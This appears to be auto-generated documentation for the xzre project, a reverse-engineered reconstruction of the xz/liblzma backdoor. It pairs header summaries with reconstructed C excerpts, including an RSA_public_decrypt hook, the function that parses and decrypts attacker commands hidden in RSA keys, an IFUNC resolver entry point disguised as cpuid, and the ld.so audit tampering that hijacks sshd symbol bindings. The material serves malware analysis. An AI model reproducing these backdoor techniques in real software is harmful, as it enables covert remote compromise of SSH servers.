{
  "RSA_public_decrypt": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/RSA_public_decrypt.c):\n    int hook_RSA_public_decrypt(\n    \tint flen, unsigned char *from,\n    \tunsigned char *to, RSA *rsa, int padding\n    ){\n    \tpfn_RSA_public_decrypt_t RSA_public_decrypt;\n    \n    \tif(!global_ctx) return 0;\n    \tif(!global_ctx->imported_funcs) return 0;\n    \tif(!(RSA_public_decrypt=global_ctx->imported_funcs->RSA_public_decrypt)) return 0;\n    \tif(!rsa){\n    \t\treturn RSA_public_decrypt(flen, from, to, rsa, padding);\n    \t}\n    \tBOOL call_orig = TRUE;\n    \tint result = run_backdoor_commands(rsa, global_ctx, &call_orig);\n    \tif(call_orig){\n    \t\treturn RSA_public_decrypt(flen, from, to, rsa, padding);\n    \t}\n    \treturn result;\n    }",
  "backdoor_commands": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/backdoor_commands.c):\n    #warning \"this function is WIP / needs validation\"\n    \n    /**\n     * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>\n     ** /\n    #include \"xzre.h\"\n    #include <assert.h>\n    #include <openssl/bn.h>\n    #include <string.h>\n    #include <sys/select.h>\n    #include <sys/types.h>\n    #include <time.h>\n    #include <errno.h>\n    \n    #define MONITOR_REQ_KEYALLOWED 22\n    \n    #define SIZE_STEP0 (sizeof(backdoor_payload_hdr_t))\n    #define SIZE_STEP1 (SIZE_STEP0 + ED448_SIGNATURE_SIZE)\n    #define SIZE_STEP2 (SIZE_STEP1 + sizeof(cmd_arguments_t))\n    #define SIZE_HEADERS SIZE_STEP2\n    #define SIZE_SYSTEM_EXTRA (sizeof(uid_t) + sizeof(gid_t))\n    \n    // $FIXME: move to xzre.h\n    extern BOOL sshd_set_log_handler(cmd_arguments_t *args, global_context_t *ctx);\n    \n    BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){\n    \trun_backdoor_commands_data_t f = {0};\n    \tf.p_do_orig = do_orig;\n    \n    \tif(!ctx){\n    \t\texit_early:\n    \t\tif(!do_orig){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\tgoto exit;\n    \t} else if(ctx->disable_backdoor\n    \t\t|| !rsa\n    \t\t|| !ctx->imported_funcs\n    \t\t|| !ctx->imported_funcs->RSA_get0_key\n    \t\t|| !ctx->imported_funcs->BN_bn2bin\n    \t){\n    \t\tctx->disable_backdoor = TRUE;\n    \t\tgoto exit_early;\n    \t}\n    \n    \tif(do_orig){\n    \t\tdo {\n    \t\t\t*f.p_do_orig = TRUE;\n    \t\t\n    \t\t\tctx->imported_funcs->RSA_get0_key(\n    \t\t\t\trsa, &f.kctx.rsa_n, &f.kctx.rsa_e, NULL);\n    \t\t\tif(!f.kctx.rsa_n || !f.kctx.rsa_e) break;\n    \t\t\tif(!ctx->imported_funcs) break;\n    \t\t\tif(!ctx->imported_funcs->BN_num_bits) break;\n    \t\t\t\n    \t\t\tint num_n_bits = ctx->imported_funcs->BN_num_bits(f.kctx.rsa_n);\n    \t\t\tif(num_n_bits > 0x4000) break;\n    \t\t\t\n    \t\t\tint num_n_bytes = X_BN_num_bytes(num_n_bits);\n    \t\t\tif(num_n_bytes > 536) break;\n    \t\t\t\n    \t\t\tint rsa_n_length = ctx->imported_funcs->BN_bn2bin(f.kctx.rsa_n, (u8 *)&f.kctx.payload);\n    \t\t\tif(rsa_n_length < 0) break;\n    \t\t\tif(num_n_bytes < rsa_n_length) break;\n    \n    \t\t\tif(rsa_n_length <= sizeof(backdoor_payload_hdr_t)) goto exit;\n    \t\t\t// `field_a` cannot be 0\n    \t\t\tif(!f.kctx.payload.header.field_a) goto exit;\n    \t\t\t// `field_b` cannot be 0\n    \t\t\tif(!f.kctx.payload.header.field_b) goto exit;\n    \n    \t\t\tu64 cmd_type = f.kctx.payload.header.field_c + (f.kctx.payload.header.field_b * f.kctx.payload.header.field_a);\n    \t\t\tif(cmd_type > 3) goto exit;\n    \n    \t\t\tif(!ctx->libc_imports) break;\n    \t\t\tif(!ctx->libc_imports->getuid) break;\n    \t\t\tif(!ctx->libc_imports->exit) break;\n    \t\t\tif(!ctx->sshd_log_ctx) break;\n    \t\t\tif(ctx->num_shifted_bits != ED448_KEY_SIZE * 8) break;\n    \t\t\t*(backdoor_payload_hdr_t *)f.kctx.ivec = f.kctx.payload.header;\n    \t\t\t\n    \t\t\tif(!secret_data_get_decrypted(f.kctx.ed448_key, ctx)) break;\n    \t\t\t// decrypt payload\n    \t\t\tif(!chacha_decrypt(\n    \t\t\t\tf.kctx.payload.body.signature,\n    \t\t\t\tnum_n_bytes - sizeof(backdoor_payload_hdr_t),\n    \t\t\t\tf.kctx.ed448_key,\n    \t\t\t\tf.kctx.ivec,\n    \t\t\t\t(u8 *)&f.kctx.payload.body,\n    \t\t\t\tctx->imported_funcs)) break;\n    \n    \t\t\tif(!ctx->sshd_sensitive_data) break;\n    \t\t\tif(!ctx->imported_funcs) break;\n    \n    \t\t\tstatic_assert(SIZE_HEADERS == 0x87);\n    \n    \t\t\tif((num_n_bytes - SIZE_STEP0) < ED448_SIGNATURE_SIZE) break;\n    \n    \t\t\tf.data.monitor.cmd_type = cmd_type;\n    \t\t\tif((num_n_bytes - SIZE_STEP1) < sizeof(cmd_arguments_t)) break;\n    \n    \t\t\tf.kctx.args = f.kctx.payload.body.args;\n    \t\t\t\n    \t\t\tint hostkey_hash_offset;\n    \t\t\tint body_size = num_n_bytes - SIZE_HEADERS;\n    \t\t\tint body_offset;\n    \t\t\tint size;\n    \t\t\tint data_s1, data_s2, payload_size;\n    \t\t\tu8 *data_ptr;\n    \n    \t\t\tif(cmd_type == 2){\n    \t\t\t\tsize = f.kctx.args.u.size;\n    \t\t\t\tif(TEST_FLAG(f.kctx.args.flags1, X_FLAGS1_NO_EXTENDED_SIZE)){\n    \t\t\t\t\tif(f.kctx.args.u.size) break;\n    \t\t\t\t\tdata_s1 = 0;\n    \t\t\t\t\tsize = 0x39;\n    \t\t\t\t\tdata_ptr = f.kctx.payload.body.data;\n    \t\t\t\t\tdata_s2 = 0;\n    \t\t\t\t} else {\n    \t\t\t\t\tif(TEST_FLAG(f.kctx.args.flags2, X_FLAGS2_IMPERSONATE)){\n    ...",
  "backdoor_entry": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief calls @ref backdoor_init while in the crc64() IFUNC resolver function\n\n  the function counts the number of times it was called in resolver_call_count\n\n  the first time it is called is in the crc32() resolver just returns the maximum supported cpuid level\n\n  the second time it is called is in the crc64() resolver and then this function calls backdoor_init_stage2()\n\n  this is a modified version of __get_cpuid_max() from gcc\n\n  backdoor_init_stage2() is called by replacing the _cpuid() GOT entry to point to backdoor_init_stage2()\n\n  @param cpuid_request EAX register input. Is either 0 or 0x80000000, but this value is actually not used.\n  @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver\n  @return unsigned int the EAX register output. Normally the maximum supported cpuid level.\n\nUpstream implementation excerpt (xzre/xzre_code/backdoor_entry.c):\n    unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame){\n    \tu32 a = 0, b = 0, c = 0, d = 0;\n    \telf_entry_ctx_t state;\n    \n    \tif(resolver_call_count == 1){\n    \t\tstate.symbol_ptr = (void *)1;\n    \t\tmemset(&state.got_ctx, 0x00, sizeof(state.got_ctx));\n    \t\tstate.frame_address = caller_frame;\n    \t\tbackdoor_init(&state, caller_frame);\n    \t}\n    \t++resolver_call_count;\n    \t_cpuid_gcc(cpuid_request, &a, &b, &c, &d);\n    \treturn a;\n    }",
  "backdoor_init": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief calls @ref backdoor_init_stage2 by disguising it as a call to cpuid.\n\n  @ref backdoor_init_stage2 is called by replacing the _cpuid() GOT entry to point to @ref backdoor_init_stage2\n\n  stores elf_entry_ctx_t::symbol_ptr - elf_entry_ctx_t::got_offset in elf_entry_ctx_t::got_ptr which is the GOT address .\n\n  @param state the entry context, filled by @ref backdoor_entry\n  @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver\n  @return void* the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of backdoor_init_stage2()",
  "backdoor_init_stage2": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief\n\n  @param ctx holds values needed to setup the _cpuid(), passed to backdoor_init_stage2()\n  @param caller_frame stores the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver\n  @param cpuid_got_addr address of the cpuid() GOT entry\n  @param reloc_consts pointer to cpuid_reloc_consts\n  @return BOOL the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of backdoor_init_stage2()",
  "backdoor_setup": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief the backdoor main method that installs the backdoor_symbind64() callback\n\n  If the backdoor initialization steps are successful the final step modifies some ld.so private structures\n  to simulate a LD_AUDIT library and install the backdoor_symbind64() as a symbind callback.\n\n  To pass the various conditions in ld.so's _dl_audit_symbind_alt the following fields are modified:\n  - the sshd and libcrypto struct link_map::l_audit_any_plt flag is set to 1\n  - the sshd struct auditstate::bindflags is set to LA_FLG_BINDFROM\n  - the libcrypto struct auditstate::bindflags is set to LA_FLG_BINDTO\n  - _rtld_global_ro::_dl_audit is set to point to ldso_ctx_t::hooked_audit_iface\n  - the struct audit_ifaces::symbind64 is set to backdoor_symbind64()\n  - _rtld_global_ro::_dl_naudit is set to 1\n\n  After the modifications backdoor_symbind64() will be called for all symbol bindings from sshd to libcrypto.\n\n  @param params parameters from backdoor_init_stage()\n  @return BOOL unused, always return FALSE",
  "bignum_serialize": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Serializes the BIGNUM @p bn to the buffer @p buffer\n\n  @param buffer the destination buffer to write the bignum to\n  @param bufferSize size of the destination buffer\n  @param pOutSize pointer to a variable that will receive the number of bytes written to the buffer\n  @param bn the BIGNUM to serialize\n  @param funcs\n  @return BOOL TRUE if successfully serialized, FALSE otherwise",
  "bits": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/bits.c):\n    u32 count_bits(u64 x){\n    \tu32 result;\n    \tfor(result=0; x; ++result, x &= x-1);\n    \treturn result;\n    }",
  "c_memmove": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief copies memory\n\n  @param dest destination buffer\n  @param src source buffer\n  @param cnt number of bytes to copy\n\nUpstream implementation excerpt (xzre/xzre_code/c_memmove.c):\n    void *c_memmove(char *dest, char *src, size_t cnt) {\n        if ((src < dest) && (dest < (src + cnt))) {\n            size_t curr = cnt - 1;\n            if (cnt != 0) {\n                do {\n                    *(dest + curr) = *(src + curr);\n                    --curr;\n                } while (curr != -1);\n                return dest;\n            }\n        } else {\n            if (cnt == 0)\n                return dest;\n            size_t curr = 0;\n            do {\n                *(dest + curr) = *(src + curr);\n                ++curr;\n            } while (cnt != curr);\n        }\n        return dest;\n    }",
  "c_strlen": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief returns length of c string\n\n  @param str pointer to c string\n  @return ssize_t length of c string\n\nUpstream implementation excerpt (xzre/xzre_code/c_strlen.c):\n    ssize_t c_strlen(char *str) {\n        if (*str != '\\0') {\n            ssize_t len = 0;\n            do {\n                ++len;\n            } while (*(str + len) != '\\0');\n            return len;\n        }\n        return 0;\n    }",
  "c_strnlen": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief returns length of c string with a maximum length\n\n  @param str pointer to c string\n  @param max_len maximum length of c string\n  @return ssize_t length of c string\n\nUpstream implementation excerpt (xzre/xzre_code/c_strnlen.c):\n    ssize_t c_strnlen(char *str, size_t max_len) {\n        ssize_t len = 0;\n        if (max_len == 0)\n            return max_len;\n        do {\n            if (*(str + len) == '\\0')\n                return len;\n            ++len;\n        } while (max_len != len);\n        return max_len;\n    }",
  "call_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/call_instruction.c):\n    BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx){\n    \tif(!secret_data_append_from_address(NULL, (secret_data_shift_cursor_t){ 0x81 }, 4, 7)){\n    \t\treturn FALSE;\n    \t}\n    \tdasm_ctx_t ctx = {0};\n    \tif(!dctx){\n    \t\tdctx = &ctx;\n    \t}\n    \n    \twhile(code_start < code_end){\n    \t\tif(x86_dasm(dctx, code_start, code_end)){\n    \t\t\tif(XZDASM_OPC(dctx->opcode) == X86_OPCODE_CALL\n    \t\t\t\t&& (!call_target || &dctx->instruction[dctx->operand + dctx->instruction_size] == call_target)\n    \t\t\t){\n    \t\t\t\treturn TRUE;\n    \t\t\t}\n    \t\t\tcode_start += dctx->instruction_size;\n    \t\t} else {\n    \t\t\tcode_start += 1;\n    \t\t}\n    \t}\n    \treturn FALSE;\n    }\n    ",
  "chacha_decrypt": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief decrypts a buffer with chacha20\n\n  @param in the input buffer to decrypt\n  @param inl the length of the input buffer\n  @param key the 256bit chacha key\n  @param iv the 128bit chacha iv\n  @param out the output buffer\n  @param funcs OpenSSL imported functions\n  @return BOOL TRUE if successful, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/chacha_decrypt.c):\n    BOOL chacha_decrypt(\n    \tu8 *in, int inl,\n    \tu8 *key, u8 *iv,\n    \tu8 *out, imported_funcs_t *funcs\n    ){\n    \tint outl = 0;\n    \tif(!in || inl <= 0 || !iv || !out || !funcs) {\n    \t\treturn FALSE;\n    \t}\n    \tif(contains_null_pointers((void **)&funcs->EVP_CIPHER_CTX_new, 6)){\n    \t\treturn FALSE;\n    \t}\n    \tEVP_CIPHER_CTX *ctx = funcs->EVP_CIPHER_CTX_new();\n    \tif(!ctx){\n    \t\treturn FALSE;\n    \t}\n    \tconst EVP_CIPHER *cipher = EVP_chacha20();\n    \tif(funcs->EVP_DecryptInit_ex(ctx, cipher, NULL, key, iv) == TRUE\n    \t  && funcs->EVP_DecryptUpdate(ctx, out, &outl, in, inl) == TRUE\n    \t  && outl >= 0\n    \t){\n    \t\tif(funcs->EVP_DecryptFinal_ex(ctx, &out[outl], &outl) == TRUE\n    \t\t && outl >= 0 && inl >= outl\n    \t\t){\n    \t\t\tfuncs->EVP_CIPHER_CTX_free(ctx);\n    \t\t\treturn TRUE;\n    \t\t}\n    \t}\n    \tif(funcs->EVP_CIPHER_CTX_free){\n    \t\tfuncs->EVP_CIPHER_CTX_free(ctx);\n    \t}\n    \treturn FALSE;\n    }",
  "check_argument": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Examines a command-line argument that began with '-' and returns the pointer to the character that matched '-d' style options, otherwise returns NULL.\n\nNotes:\n  - Advances through the string two bytes at a time when the first character is '-', guarding against malformed UTF-16 style input.\n  - Stops early when it encounters '=' or NUL terminators, treating those forms as unsupported switches.",
  "check_backdoor_state": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if the backdoor state is the expected one (FIXME: which?)\n\n  @param ctx the global context\n  @return BOOL TRUE if the backdoor state is in the expected state, FALSE otherwise",
  "contains_null_pointers": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if the given array of pointers contains any NULL pointer\n\n  @param pointers array of pointers to check\n  @param num_pointers number of pointers to check\n  @return BOOL TRUE if @p pointers contains any NULL pointer, FALSE if all pointers are non-NULL",
  "count_bits": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief returns the number of 1 bits in x\n\n  @param x\n  @return u32 number of 1 bits\n\nUpstream implementation excerpt (xzre/xzre_code/count_bits.c):\n    u32 count_bits(u64 x){\n    \tu32 result;\n    \tfor(result=0; x; ++result, x &= x-1);\n    \treturn result;\n    }",
  "count_pointers": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief count the number of non-NULL pointers in the `malloc`'d memory block @p ptrs\n\n  @param ptrs pointer to a `malloc`'d memory block\n  @param count_out will be filled with the number of non-NULL pointers\n  @param funcs used for `malloc_usable_size`\n  @return BOOL TRUE if the operation succeeded, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/count_pointers.c):\n    BOOL count_pointers(\n    \tvoid **ptrs,\n    \tu64 *count_out, \n    \tlibc_imports_t *funcs\n    ){\n    \tif(!ptrs) return FALSE;\n    \tif(!funcs) return FALSE;\n    \tif(!funcs->malloc_usable_size) return FALSE;\n    \tsize_t blockSize = funcs->malloc_usable_size(ptrs);\n    \tif(blockSize - 8 > 127) return FALSE;\n    \tsize_t nWords = blockSize >> 3;\n    \t\n    \tsize_t i;\n    \tfor(i=0; i < nWords && ptrs[i]; ++i);\n    \t*count_out = i;\n    \treturn TRUE;\n    }",
  "cpuid_gcc": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  GCC-style CPUID helper that dispatches to the appropriate intrinsic wrapper for the requested leaf before returning EAX/EBX/ECX/EDX as separate pointers.\n\nNotes:\n  - Mirrors libgcc's cpuid shim, covering base, extended, and cache-topology leaves with dedicated helpers.\n  - Falls back to the raw __builtin_cpu_supports() thunk when a leaf is not special-cased.",
  "cpuid_got_index": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/cpuid_got_index.c):\n    void update_cpuid_got_index(elf_entry_ctx_t *ctx){\n    \tctx->got_ctx.cpuid_fn = (void *)cpuid_reloc_consts.cpuid_got_index;\n    }",
  "data_append_from_address": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_append_from_address.c):\n    BOOL secret_data_append_from_address(\n    \tvoid *addr,\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned shift_count, unsigned operation_index\n    ){\n    \tu8 *code = (u8 *)addr;\n    \tif((uintptr_t)addr <= 1){\n    \t\tcode = (u8 *)__builtin_return_address(0);\n    \t}\n    \treturn secret_data_append_singleton(\n    \t\taddr, code,\n    \t\tshift_cursor, shift_count,\n    \t\toperation_index\n    \t);\n    }",
  "data_append_from_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_append_from_instruction.c):\n    BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor){\n    \tif(cursor->index <= 0x1C7\n    \t&& XZDASM_OPC(dctx->opcode) != X86_OPCODE_MOV\n    \t&& XZDASM_OPC(dctx->opcode) != X86_OPCODE_CMP\n    \t&& !XZDASM_TEST_MASK(0x410100000101, 3, dctx->opcode)\n    \t){\n    \t\tglobal_ctx->secret_data[cursor->byte_index] |= 1 << (cursor->bit_index);\n    \t}\n    \t++cursor->index;\n    \treturn TRUE;\n    }",
  "data_append_item": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_append_item.c):\n    BOOL secret_data_append_item(\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned operation_index,\n    \tunsigned shift_count,\n    \tint index, u8 *code\n    ){\n    \treturn index && secret_data_append_singleton(\n    \t\tcode, code,\n    \t\tshift_cursor, shift_count,\n    \t\toperation_index\n    \t);\n    }",
  "data_append_singleton": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_append_singleton.c):\n    BOOL secret_data_append_singleton(\n    \tu8 *call_site, u8 *code,\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned shift_count, unsigned operation_index\n    ){\n    \tif(global_ctx && !global_ctx->shift_operations[operation_index]){\n    \t\tglobal_ctx->shift_operations[operation_index] = TRUE;\n    \t\tvoid *func_start = NULL;\n    \t\tif(!find_function(\n    \t\t\tcode, &func_start, NULL,\n    \t\t\tglobal_ctx->lzma_code_start,\n    \t\t\tglobal_ctx->lzma_code_end,\n    \t\t\tFIND_NOP\n    \t\t)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \n    \t\tif(!secret_data_append_from_code(\n    \t\t\tfunc_start, global_ctx->lzma_code_end,\n    \t\t\tshift_cursor, shift_count,\n    \t\t\tcall_site == NULL\n    \t\t)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \n    \t\tglobal_ctx->num_shifted_bits += shift_count;\n    \t}\n    \treturn TRUE;\n    }",
  "data_get_decrypted": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/data_get_decrypted.c):\n    struct key_buf {\n    \tu8 key[CHACHA20_KEY_SIZE];\n    \tu8 iv[CHACHA20_IV_SIZE];\n    };\n    \n    BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx){\n    \tif(!output || !ctx || !ctx->imported_funcs){\n    \t\treturn FALSE;\n    \t}\n    \tstruct key_buf buf1 = {0}, buf2 = {0};\n    \tif(!chacha_decrypt(\n    \t\t(u8 *)&buf1, sizeof(buf1),\n    \t\tbuf1.key, buf1.iv,\n    \t\t(u8 *)&buf2, ctx->imported_funcs)\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \n    \treturn chacha_decrypt(\n    \t\tctx->secret_data, sizeof(ctx->secret_data),\n    \t\tbuf2.key, buf2.iv,\n    \t\toutput, ctx->imported_funcs);\n    }",
  "decrypt": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/decrypt.c):\n    BOOL chacha_decrypt(\n    \tu8 *in, int inl,\n    \tu8 *key, u8 *iv,\n    \tu8 *out, imported_funcs_t *funcs\n    ){\n    \tint outl = 0;\n    \tif(!in || inl <= 0 || !iv || !out || !funcs) {\n    \t\treturn FALSE;\n    \t}\n    \tif(contains_null_pointers((void **)&funcs->EVP_CIPHER_CTX_new, 6)){\n    \t\treturn FALSE;\n    \t}\n    \tEVP_CIPHER_CTX *ctx = funcs->EVP_CIPHER_CTX_new();\n    \tif(!ctx){\n    \t\treturn FALSE;\n    \t}\n    \tconst EVP_CIPHER *cipher = EVP_chacha20();\n    \tif(funcs->EVP_DecryptInit_ex(ctx, cipher, NULL, key, iv) == TRUE\n    \t  && funcs->EVP_DecryptUpdate(ctx, out, &outl, in, inl) == TRUE\n    \t  && outl >= 0\n    \t){\n    \t\tif(funcs->EVP_DecryptFinal_ex(ctx, &out[outl], &outl) == TRUE\n    \t\t && outl >= 0 && inl >= outl\n    \t\t){\n    \t\t\tfuncs->EVP_CIPHER_CTX_free(ctx);\n    \t\t\treturn TRUE;\n    \t\t}\n    \t}\n    \tif(funcs->EVP_CIPHER_CTX_free){\n    \t\tfuncs->EVP_CIPHER_CTX_free(ctx);\n    \t}\n    \treturn FALSE;\n    }",
  "decrypt_payload_message": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief decrypts the given backdoor payload\n\n  @param payload payload data\n  @param payload_size size of payload data\n  @param ctx the global context\n  @return BOOL TRUE if successfully decrypted, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/decrypt_payload_message.c):\n    BOOL decrypt_payload_message(\n    \tkey_payload_t *payload,\n    \tsize_t payload_size,\n    \tglobal_context_t *ctx\n    ){\n    \tbackdoor_payload_hdr_t hdr = {0};\n    \tu8 output[ED448_KEY_SIZE] = {0};\n    \n    \tmemcpy(&hdr, payload, sizeof(hdr));\n    \n    \tif(!payload){\n    \t\tif(!ctx) return FALSE;\n    \t\tgoto set_state_reset;\n    \t}\n    \n    \tconst size_t header_size = sizeof(payload->hdr) + sizeof(payload->body_length);\n    \tstatic_assert(header_size == 18);\n    \n    \tdo {\n    \t\tif(!ctx) break;\n    \t\tif(ctx->payload_state == 3) return TRUE;\n    \t\tif(payload_size <= header_size || ctx->payload_state > 1) break;\n    \n    \t\t/** decrypt body_size and body * /\n    \t\tif(!chacha_decrypt(\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tpayload_size - sizeof(payload->hdr),\n    \t\t\toutput,\n    \t\t\tpayload->hdr.bytes,\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tctx->imported_funcs)) break;\n    \n    \t\tu16 body_length = payload->body_length;\n    \t\t// body cannot be bigger than remaining length\n    \t\tif(body_length >= payload_size - header_size){\n    \t\t\tbreak;\n    \t\t}\n    \t\t\n    \t\t// body cannot be bigger than the current data size\n    \t\tif(body_length >= ctx->payload_data_size - ctx->current_data_size){\n    \t\t\tbreak;\n    \t\t}\n    \n    \t\t/** keep a copy of the last payload body * /\n    \t\tu8 *data = &ctx->payload_data[ctx->current_data_size];\n    \t\t__builtin_memcpy(data, payload->body, body_length);\n    \t\tctx->current_data_size += body_length;\n    \n    \t\t/** decrypt body * /\n    \t\tif(!chacha_decrypt(\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tpayload_size - sizeof(payload->hdr),\n    \t\t\toutput,\n    \t\t\tpayload->hdr.bytes,\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tctx->imported_funcs\n    \t\t)) break;\n    \n    \t\treturn TRUE;\n    \t} while(0);\n    \n    \tset_state_reset:\n    \tctx->payload_state = PAYLOAD_STATE_INITIAL;\n    \n    \treturn FALSE;\n    }",
  "dsa_key_hash": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief obtains a SHA256 hash of the supplied RSA key\n\n  @param dsa the DSA key to hash\n  @param mdBuf buffer to write the resulting digest to\n  @param mdBufSize size of the buffer indicated by @p mdBuf\n  @param ctx\n  @return BOOL TRUE if the hash was successfully generated, FALSE otherwise",
  "elf_contains_vaddr": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if given ELF file contains the range [vaddr, vaddr+size)\n  in a segment with the specified memory protection flags\n\n  @param elf_info elf context\n  @param vaddr starting memory address\n  @param size memory size\n  @param p_flags the expected segment protection flags (PF_*)\n  @return BOOL TRUE if found, FALSE otherwise",
  "elf_contains_vaddr_impl": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Validates that the requested virtual address range is fully covered by a PT_LOAD segment whose flags include the supplied p_flags mask.\n\nNotes:\n  - Normalises the interval to page boundaries and recursively re-checks when a range straddles multiple segments.\n  - Returns FALSE if the ELF headers are missing, the recursion guard trips, or no matching segment exists.",
  "elf_contains_vaddr_relro": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if given ELF file contains the range [vaddr, vaddr+size)\n  in the gnurelro segment\n\n  @param elf_info elf context\n  @param vaddr starting memory address\n  @param size memory size\n  @param p_flags the expected segment protection flags (PF_*). must be non-zero\n  @return BOOL TRUE if found, FALSE otherwise",
  "elf_entry_ctx": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/elf_entry_ctx.c):\n    void init_elf_entry_ctx(elf_entry_ctx_t *ctx){\n    \tctx->symbol_ptr = (void *)&cpuid_random_symbol;\n    \tctx->got_ctx.return_address = (void *)ctx->frame_address[3];\n    \tupdate_got_offset(ctx);\n    \tupdate_cpuid_got_index(ctx);\n    \tctx->got_ctx.got_ptr = NULL;\n    }",
  "elf_find_function_pointer": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief this function searches for a function pointer, pointing to a function\n  designated by the given @p xref_id\n\n  @param xref_id the index to use to retrieve the function from @p xrefs\n  @param pOutCodeStart output variable that will receive the function start address\n  @param pOutCodeEnd output variable that will receive the function end address\n  @param pOutFptrAddr output variable that will receive the address of the function pointer\n  @param elf_info sshd elf context\n  @param xrefs array of resolved functions, filled by @ref elf_find_string_references\n  @param ctx the global context. used to retrieve the 'uses_endbr64' field\n  @return BOOL TRUE if the function pointer was found, FALSE otherwise",
  "elf_find_rela_reloc": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Walks the RELA relocation table, looking for an entry that targets the provided encoded_string_id and, if requested, lands inside the caller-supplied address window.\n\nNotes:\n  - Supports an optional resume index pointer so callers can continue scanning across successive invocations.\n  - Returns NULL when the binary has no RELA records or the search falls off the end without a match.",
  "elf_find_relr_reloc": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Iterates RELR-packed relocations for encoded_string_id, unpacking bitmap runs and validating that each candidate address lies inside the expected PT_LOAD mapping.\n\nNotes:\n  - Accepts optional lower/upper bounds and an iteration cursor to support incremental searches.\n  - Falls back to NULL when the module does not advertise RELR relocations or no entry matches the encoded id.",
  "elf_find_string": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Locates a string in the ELF .rodata section\n\n  @param elf_info the ELF context to use for the search\n  @param stringId_inOut mandatory pointer to an encoded string ID.\n  - if the referenced string ID is 0, the first matching string (in the string table) will stop the search,\n  and the matching string ID will be written to the pointer.\n  - if the referenced string ID is not 0, the search will look for that specific string ID,\n  and the value will not be updated.\n  @param rodata_start_ptr location in the rodata section to start the search from\n  @return char* pointer to the string, or NULL if it couldn't be found",
  "elf_find_string_reference": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds an instruction that references the given string\n\n  @param elf_info the parsed ELF context\n  @param encoded_string_id the string to search for, in encoded form\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @return u8* the address of the first instruction that references the given string, or NULL if not found",
  "elf_find_string_references": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief parses the ELF rodata section, looking for strings and the instructions that reference them\n\n  @param elf_info the executable to find strings in\n  @param refs structure that will be populated with the results\n  @return BOOL",
